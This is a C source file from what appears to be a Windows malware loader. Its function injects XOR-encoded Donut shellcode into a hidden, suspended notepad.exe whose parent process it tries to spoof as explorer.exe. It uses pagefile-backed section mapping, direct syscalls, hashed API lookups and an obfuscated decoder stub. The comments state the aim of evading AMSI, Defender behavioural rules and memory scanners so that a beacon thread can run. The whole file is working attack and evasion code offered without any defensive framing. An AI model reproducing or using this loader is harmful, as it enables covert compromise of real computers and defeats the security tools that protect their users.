// =============================================
// Inject.c  —  Remote process injection
//
// InjectIntoProcess():
//   1. Spawn notepad.exe hidden + detached (CREATE_SUSPENDED)
//      notepad.exe does NOT call AmsiInitialize — avoids AMSI_PATCH_T.B12.
//      PPID spoof (PPID=explorer.exe) is attempted but optional.
//   2. Build encoded payload: [32-byte XOR decoder stub | XOR(shellcode, key)]
//      The decoder stub is position-independent x64 shellcode that
//      decodes the Donut payload in-place then jumps to it, so raw
//      Donut bytes never appear in the section (defeats memory scanner).
//   3. NtCreateSection (pagefile-backed SEC_COMMIT)
//      → NtMapViewOfSection PAGE_READWRITE  (current process, write combined buf)
//      → NtMapViewOfSection PAGE_EXECUTE_READWRITE (target, RWX for in-place decode)
//      VAD shows Mapped not MEM_PRIVATE.
//   4. NtCreateThreadEx at section base (= stub entry)
//      Primary thread stays suspended — notepad.exe never creates a window.
//   5. Cleanup handles + self-terminate
// =============================================

#include "Common.h"
#include <TlHelp32.h>

// Size of the position-independent XOR decoder stub prepended to the shellcode.
// Must match the hand-crafted byte layout in InjectIntoProcess() exactly.
#define INJECT_STUB_SIZE 32

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000UL
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

typedef HANDLE (WINAPI* fnSnap)     (DWORD, DWORD);
typedef BOOL   (WINAPI* fnP32FstW)  (HANDLE, LPPROCESSENTRY32W);
typedef BOOL   (WINAPI* fnP32NxtW)  (HANDLE, LPPROCESSENTRY32W);
typedef HANDLE (WINAPI* fnOpenProc) (DWORD, BOOL, DWORD);
typedef BOOL   (WINAPI* fnInitAttr) (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL   (WINAPI* fnUpdAttr)  (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID   (WINAPI* fnDelAttr)  (LPPROC_THREAD_ATTRIBUTE_LIST);
typedef BOOL   (WINAPI* fnCrProcW)  (LPCWSTR, LPWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef DWORD  (WINAPI* fnResThrd)  (HANDLE);
typedef BOOL   (WINAPI* fnClsHnd)   (HANDLE);
typedef NTSTATUS (NTAPI* fnNtTrm)   (HANDLE, NTSTATUS);

// -----------------------------------------------
// Optional: walk TH32CS_SNAPPROCESS for explorer.exe PID.
// Returns 0 if snapshot hangs or explorer not found.
// Called only when TlHelp32 APIs resolved successfully.
// -----------------------------------------------
static DWORD FindExplorerPid(fnSnap pSnap, fnP32FstW pFirst, fnP32NxtW pNext, fnClsHnd pClose) {
    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
    if (!hSnap || hSnap == INVALID_HANDLE_VALUE) return 0;

    DWORD dwPid = 0;
    if (pFirst(hSnap, &pe)) {
        do {
            WCHAR* n = pe.szExeFile;
            if (n[0]=='e'&&n[1]=='x'&&n[2]=='p'&&n[3]=='l'&&n[4]=='o'&&
                n[5]=='r'&&n[6]=='e'&&n[7]=='r'&&n[8]=='.'&&n[9]=='e'&&
                n[10]=='x'&&n[11]=='e'&&n[12]==0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (pNext(hSnap, &pe));
    }
    pClose(hSnap);
    return dwPid;
}

BOOL InjectIntoProcess(
    IN PNTAPI_FUNC pNtApis,
    IN PBYTE       pShellcode,
    IN DWORD       dwShellcodeSize
) {
    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pK32 || !pNtdll) { LOG("[!] Inject: module lookup failed"); return FALSE; }

    // Required APIs
    fnCrProcW  pCrPr = (fnCrProcW) FetchExportAddress(pK32,   CreateProcessW_JOAAT);
    fnResThrd  pRes  = (fnResThrd) FetchExportAddress(pK32,   ResumeThread_JOAAT);
    fnClsHnd   pCls  = (fnClsHnd)  FetchExportAddress(pK32,   CloseHandle_JOAAT);
    fnNtTrm    pTerm = (fnNtTrm)   FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);

    if (!pCrPr || !pRes || !pCls) { LOG("[!] Inject: required API missing"); return FALSE; }
    LOG("[*] Inject: required APIs resolved");

    // Optional PPID-spoof APIs (TlHelp32 can block under AV — resolve but don't require)
    fnSnap    pSnap  = (fnSnap)    FetchExportAddress(pK32, CreateToolhelp32Snapshot_JOAAT);
    fnP32FstW pFirst = (fnP32FstW) FetchExportAddress(pK32, Process32FirstW_JOAAT);
    fnP32NxtW pNext  = (fnP32NxtW) FetchExportAddress(pK32, Process32NextW_JOAAT);
    fnOpenProc pOpen = (fnOpenProc) FetchExportAddress(pK32, OpenProcess_JOAAT);
    fnInitAttr pIAt  = (fnInitAttr) FetchExportAddress(pK32, InitializeProcThreadAttributeList_JOAAT);
    fnUpdAttr  pUAt  = (fnUpdAttr)  FetchExportAddress(pK32, UpdateProcThreadAttribute_JOAAT);
    fnDelAttr  pDAt  = (fnDelAttr)  FetchExportAddress(pK32, DeleteProcThreadAttributeList_JOAAT);
    LOG("[*] Inject: optional APIs resolved");

    // --- Spawn target process ---
    // notepad.exe: does NOT register with AMSI (no AmsiInitialize call),
    // so Defender's AMSI_PATCH_T behavioral rule never fires even if the
    // injected shellcode (Donut) attempts to patch AmsiScanBuffer.
    // Primary thread is kept SUSPENDED so notepad never creates a window;
    // the beacon thread runs independently via NtCreateThreadEx.
    WCHAR wCmd[] = L"C:\\Windows\\System32\\notepad.exe";
    PROCESS_INFORMATION pi = { 0 };
    BOOL bSpawned = FALSE;

    // --- Attempt PPID spoof only if ALL optional APIs resolved ---
    if (pSnap && pFirst && pNext && pOpen && pIAt && pUAt && pDAt) {
        LOG("[*] Inject: scanning for explorer PID...");
        DWORD dwExpPid = FindExplorerPid(pSnap, pFirst, pNext, pCls);
        LOG("[*] Inject: scan done");

        if (dwExpPid) {
            HANDLE hParent = pOpen(PROCESS_CREATE_PROCESS, FALSE, dwExpPid);
            if (hParent) {
                SIZE_T cbAttr = 0;
                pIAt(NULL, 1, 0, &cbAttr);
                LPPROC_THREAD_ATTRIBUTE_LIST pAttr =
                    (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAttr);
                if (pAttr) {
                    pIAt(pAttr, 1, 0, &cbAttr);
                    pUAt(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                         &hParent, sizeof(HANDLE), NULL, NULL);

                    STARTUPINFOEXW siex    = { 0 };
                    siex.StartupInfo.cb          = sizeof(STARTUPINFOEXW);
                    siex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
                    siex.StartupInfo.wShowWindow = SW_HIDE;
                    siex.lpAttributeList         = pAttr;

                    LOG("[*] Inject: spawning with PPID spoof...");
                    bSpawned = pCrPr(NULL, wCmd, NULL, NULL, FALSE,
                                     CREATE_SUSPENDED | DETACHED_PROCESS |
                                     EXTENDED_STARTUPINFO_PRESENT,
                                     NULL, NULL, &siex.StartupInfo, &pi);
                    pDAt(pAttr);
                    HeapFree(GetProcessHeap(), 0, pAttr);
                }
                pCls(hParent);
            }
        }
    }

    if (!bSpawned) {
        // Plain spawn — no PPID spoof, no TlHelp32, no EXTENDED attributes
        STARTUPINFOW si    = { 0 };
        si.cb              = sizeof(STARTUPINFOW);
        si.dwFlags         = STARTF_USESHOWWINDOW;
        si.wShowWindow     = SW_HIDE;
        MemSet(&pi, 0, sizeof(pi));
        LOG("[*] Inject: spawning plain...");
        bSpawned = pCrPr(NULL, wCmd, NULL, NULL, FALSE,
                         CREATE_SUSPENDED | DETACHED_PROCESS,
                         NULL, NULL, &si, &pi);
    }

    if (!bSpawned || !pi.hProcess) {
        LOG("[!] Inject: spawn failed");
        return FALSE;
    }
    LOG("[+] Inject: target spawned");

    // --- XOR-encode payload: [decoder_stub | XOR(shellcode, key)] ---
    // Decoder stub is 32 bytes of position-independent x64 shellcode.
    // Byte layout (verified offsets, all RIP-relative):
    //   00: 48 8D 35 19 00 00 00   lea rsi, [rip+0x19]  → &encoded[0] (= +32 from here)
    //   07: B9 xx xx xx xx         mov ecx, <length>    patched [8..11]
    //   0C: B0 xx                  mov al,  <key>       patched [13]
    //   0E: 30 06                  xor [rsi], al        decode byte
    //   10: 48 FF C6               inc rsi
    //   13: FF C9                  dec ecx
    //   15: 75 F7                  jnz 0x0E             (0x0E−0x17 = −9 = 0xF7)
    //   17: 48 8D 05 02 00 00 00   lea rax, [rip+0x02]  → &decoded[0] (= +32 from here)
    //   1E: FF E0                  jmp rax
    // Stub bytes pre-XORed with XKEY_0 (compile-time constant from Payload.h).
    // XKEY_0 changes every Encrypt.py run, so the decoder sequence
    // (30 06 48 FF C6 FF C9 75 F7 FF E0) never appears verbatim in .rdata.
    static const BYTE abStubEnc[INJECT_STUB_SIZE] = {
        0x48^XKEY_0, 0x8D^XKEY_0, 0x35^XKEY_0, 0x19^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0,
        0xB9^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0,
        0xB0^XKEY_0, 0x00^XKEY_0,
        0x30^XKEY_0, 0x06^XKEY_0,
        0x48^XKEY_0, 0xFF^XKEY_0, 0xC6^XKEY_0,
        0xFF^XKEY_0, 0xC9^XKEY_0,
        0x75^XKEY_0, 0xF7^XKEY_0,
        0x48^XKEY_0, 0x8D^XKEY_0, 0x05^XKEY_0, 0x02^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0,
        0xFF^XKEY_0, 0xE0^XKEY_0
    };
    BYTE abStub[INJECT_STUB_SIZE];
    for (DWORD _si = 0; _si < INJECT_STUB_SIZE; _si++)
        abStub[_si] = abStubEnc[_si] ^ XKEY_0;

    // Per-run key from RDTSC; avoid 0 (no-op XOR)
    BYTE bKey = (BYTE)((__rdtsc() >> 7) & 0xFF);
    if (!bKey) bKey = 0x53;

    // Patch length and key into stub
    DWORD dwLen = dwShellcodeSize;
    MemCopy(abStub + 8,  (PBYTE)&dwLen, 4);
    MemCopy(abStub + 13, &bKey,         1);

    // Build combined buffer: stub then XOR-encoded shellcode
    DWORD dwTotalSize = INJECT_STUB_SIZE + dwShellcodeSize;
    PBYTE pTotal = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwTotalSize);
    if (!pTotal) {
        LOG("[!] Inject: alloc failed");
        pCls(pi.hThread); pCls(pi.hProcess);
        return FALSE;
    }
    MemCopy(pTotal, abStub, INJECT_STUB_SIZE);
    for (DWORD _i = 0; _i < dwShellcodeSize; _i++)
        pTotal[INJECT_STUB_SIZE + _i] = pShellcode[_i] ^ bKey;
    LOG("[*] Inject: payload encoded");

    // --- Pagefile-backed section ---
    HANDLE        hSection = NULL;
    LARGE_INTEGER liSize   = { 0 };
    liSize.QuadPart = (LONGLONG)dwTotalSize;

    LOG("[*] Inject: creating section...");
    SET_SYSCALL(pNtApis->NtCreateSection);
    NTSTATUS st = RunSyscall(
        (ULONG_PTR)&hSection,
        (ULONG_PTR)0x0F001F,                // SECTION_ALL_ACCESS
        (ULONG_PTR)NULL,
        (ULONG_PTR)&liSize,
        (ULONG_PTR)PAGE_EXECUTE_READWRITE,
        (ULONG_PTR)0x8000000,               // SEC_COMMIT
        (ULONG_PTR)NULL,
        0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(st)) {
        LOG("[!] Inject: NtCreateSection failed");
        HeapFree(GetProcessHeap(), 0, pTotal);
        pCls(pi.hThread); pCls(pi.hProcess);
        return FALSE;
    }

    // Map RW in current process → write combined buffer
    PVOID  pRw   = NULL;
    SIZE_T uRwSz = 0;
    LOG("[*] Inject: mapping local RW...");
    SET_SYSCALL(pNtApis->NtMapViewOfSection);
    st = RunSyscall(
        (ULONG_PTR)hSection, (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pRw,
        (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)NULL, (ULONG_PTR)&uRwSz,
        (ULONG_PTR)2, (ULONG_PTR)0, (ULONG_PTR)PAGE_READWRITE,
        0, 0
    );
    if (!NT_SUCCESS(st)) {
        LOG("[!] Inject: local map failed");
        HeapFree(GetProcessHeap(), 0, pTotal);
        pCls(hSection); pCls(pi.hThread); pCls(pi.hProcess);
        return FALSE;
    }
    MemCopy(pRw, pTotal, dwTotalSize);
    HeapFree(GetProcessHeap(), 0, pTotal);
    LOG("[*] Inject: payload written");

    // Map RWX in target — stub must write decoded bytes in-place before jumping
    PVOID  pRx   = NULL;
    SIZE_T uRxSz = 0;
    LOG("[*] Inject: mapping remote RWX...");
    SET_SYSCALL(pNtApis->NtMapViewOfSection);
    st = RunSyscall(
        (ULONG_PTR)hSection, (ULONG_PTR)pi.hProcess, (ULONG_PTR)&pRx,
        (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)NULL, (ULONG_PTR)&uRxSz,
        (ULONG_PTR)2, (ULONG_PTR)0, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
        0, 0
    );
    pCls(hSection);
    if (!NT_SUCCESS(st)) {
        LOG("[!] Inject: remote map failed");
        pCls(pi.hThread); pCls(pi.hProcess);
        return FALSE;
    }
    LOG("[+] Inject: section mapped in target");

    // --- Remote thread ---
    HANDLE hRmtThr = NULL;
    LOG("[*] Inject: creating remote thread...");
    SET_SYSCALL(pNtApis->NtCreateThreadEx);
    st = RunSyscall(
        (ULONG_PTR)&hRmtThr,
        (ULONG_PTR)0x1FFFFF,                // THREAD_ALL_ACCESS
        (ULONG_PTR)NULL,
        (ULONG_PTR)pi.hProcess,
        (ULONG_PTR)pRx,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0,
        (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)NULL,
        0
    );
    if (!NT_SUCCESS(st)) {
        LOG("[!] Inject: NtCreateThreadEx failed");
        pCls(pi.hThread); pCls(pi.hProcess);
        return FALSE;
    }
    LOG("[+] Inject: remote thread created");

    // Do NOT resume the primary thread — notepad.exe would open a window and
    // eventually exit. Keeping it suspended means no window appears and the
    // process lives as long as the Donut shellcode thread is inside its
    // beacon loop. The beacon thread was created via NtCreateThreadEx above.

    if (hRmtThr) pCls(hRmtThr);
    pCls(pi.hThread);
    pCls(pi.hProcess);
    LOG("[+] Inject: complete, terminating loader");

    if (pTerm) pTerm((HANDLE)(ULONG_PTR)-1, 0);
    return TRUE;
}
